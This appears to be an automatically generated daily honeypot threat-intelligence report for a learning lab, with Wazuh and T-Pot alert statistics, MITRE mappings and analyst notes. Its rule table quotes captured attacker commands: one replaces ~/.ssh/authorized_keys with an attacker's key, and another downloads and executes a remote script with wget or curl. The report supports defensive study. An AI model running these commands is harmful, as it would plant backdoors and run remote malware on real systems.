# LearningLab01 Daily Threat Intelligence Report — 2026-10-15

Generated: 2026-10-15T13:15:05.051Z

Report window: 2026-10-14T13:15:05.029Z through 2026-10-15T13:15:05.029Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 267,063 |
| Attack-related alerts | 18,528 |
| Honeypot interactions | 250,749 |
| Authentication failures | 6,568 |
| Authentication successes | 429 |
| Critical alerts | 98 |
| High alerts | 408 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 98 critical-severity alerts require priority review.
- 408 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 15.31:1.
- Country attribution currently covers only 0.60% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (189,193 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 98 | 0.04% |
| High | 408 | 0.15% |
| Medium | 1,908 | 0.71% |
| Low | 264,649 | 99.10% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 6,568
- Authentication successes: 429
- Failure-to-success ratio: 15.31:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 9,877 | 53.31% |
| Payload delivery | 9,877 | 53.31% |
| Authentication failure | 6,568 | 35.45% |
| Command execution | 1,117 | 6.03% |
| Reconnaissance | 500 | 2.70% |
| Network scan | 287 | 1.55% |
| Malware | 102 | 0.55% |
| Web attack | 93 | 0.50% |
| SMTP attack | 6 | 0.03% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 1,602 alerts, representing 0.60% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 265,461 | 99.40% | Not geolocated |
| Republic of Moldova | 644 | 0.24% | ████████████████████ |
| Germany | 372 | 0.14% | ████████████ |
| United Kingdom | 150 | 0.06% | █████ |
| Romania | 126 | 0.05% | ████ |
| Bulgaria | 120 | 0.04% | ████ |
| United States | 77 | 0.03% | ██ |
| Bosnia and Herzegovina | 63 | 0.02% | ██ |
| British Virgin Islands | 22 | 0.01% | █ |
| China | 8 | 0.00% | █ |
| Hungary | 6 | 0.00% | █ |
| Panama | 5 | 0.00% | █ |
| Russia | 4 | 0.00% | █ |
| Malaysia | 3 | 0.00% | █ |
| Netherlands | 1 | 0.00% | █ |
| Switzerland | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 296 |
| Initial Access | 291 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Credential Access | 102 |
| Lateral Movement | 97 |
| Impact | 42 |
| Execution | 34 |
| Command and Control | 2 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Brute Force | 102 |
| Remote Services | 97 |
| Stored Data Manipulation | 38 |
| Command and Scripting Interpreter | 34 |
| Data Destruction | 4 |
| File Deletion | 4 |
| Ingress Tool Transfer | 2 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 189,193 | T-Pot RDP connection from [IP address] to port 3389. | tpot (189,193) |
| 110207 | 5 | 26,798 | T-Pot SentryPeer SIP activity from [IP address]:64126, method INVITE | tpot (26,798) |
| 110204 | 4 | 21,892 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (21,892) |
| 110205 | 6 | 9,812 | T-Pot Honeytrap received a payload from [IP address] | tpot (9,812) |
| 110101 | 3 | 7,491 | Cowrie SSH connection from [IP address]. | tpot (7,491) |
| 110102 | 5 | 6,568 | Cowrie failed login from [IP address] using username root. | tpot (6,568) |
| 110219 | 4 | 1,352 | T-Pot CiscoASA web activity from [IP address]: "GET / HTTP/1.1" 200 - | tpot (1,352) |
| 110104 | 7 | 983 | Cowrie captured a command from [IP address]: za | tpot (983) |
| 110201 | 4 | 728 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (728) |
| 110214 | 9 | 284 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (284) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 110221 | 7 | 184 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (184) |
| 5502 | 3 | 173 | PAM: Login session closed. | tpot (171), wazuh (2) |
| 110103 | 10 | 138 | Cowrie accepted login from [IP address] using username lghkel	. | tpot (138) |
| 110106 | 10 | 102 | Cowrie detected repeated failed logins from [IP address]. | tpot (102) |
| 110109 | 13 | 98 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (98) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110209 | 5 | 94 | T-Pot Conpot IEC104 event from [IP address]: NEW_CONNECTION | tpot (94) |
| 110223 | 5 | 93 | T-Pot HoneyAML received  request from  to  on port . | tpot (93) |
| 110215 | 4 | 78 | T-Pot MiniPrint event: command_received, action request, Request received | tpot (78) |
| 110216 | 4 | 76 | T-Pot Mailoney received SMTP command from [IP address]: EHLO attacker.com  | tpot (76) |
| 110220 | 8 | 67 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (67) |
| 110105 | 12 | 66 | Cowrie captured a file download from [IP address]. | tpot (66) |
| 110212 | 10 | 65 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (65) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110108 | 12 | 34 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (34) |
| 550 | 7 | 27 | Integrity checksum changed. | tpot (14), wazuh (13) |
| 110208 | 7 | 22 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5120 | tpot (22) |
| 2904 | 7 | 18 | Dpkg (Debian Package) half configured. | wazuh (18) |
| 2902 | 7 | 11 | New dpkg (Debian Package) installed. | wazuh (11) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110217 | 7 | 6 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: MAIL FROM:<hello@info.com>  | tpot (6) |
| 553 | 7 | 4 | File deleted. | tpot (4) |
| 554 | 5 | 4 | File added to the system. | tpot (4) |
| 110211 | 9 | 3 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (3) |
| 110107 | 12 | 2 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 19010 | 3 | 2 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from failed to passed | tpot (2) |
| 19011 | 9 | 2 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from passed to failed | tpot (2) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 110226 | 10 | 1 | T-Pot HoneyAML detected repeated web requests from one source. | tpot (1) |
| 202 | 7 | 1 | Agent event queue is 90% full. | tpot (1) |
| 203 | 9 | 1 | Agent event queue is full. Events may be lost. | tpot (1) |
| 205 | 3 | 1 | Agent event queue is back to normal load. | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
